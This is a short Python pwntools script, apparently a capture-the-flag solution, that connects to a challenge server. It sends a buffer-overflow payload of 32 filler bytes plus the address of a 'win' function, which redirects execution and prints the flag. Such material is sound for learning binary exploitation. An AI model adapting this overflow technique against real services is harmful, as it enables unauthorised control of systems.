from pwn import *

hostname = ...
port = ...
p = remote(hostname, port)

# Choose "Write to buffer" option
p.recv()
p.sendline(b"2")
p.recv()

# Construct payload
# Address of `win` discovered by decompiling `chall` with Binary Ninja
win_addr = 0x00000000004011a0
payload = b"A" * 32 + win_addr.to_bytes(3, "little")
p.sendline(payload)

p.recv()
p.sendline(b"4")

flag = p.recv().strip()
print(flag)
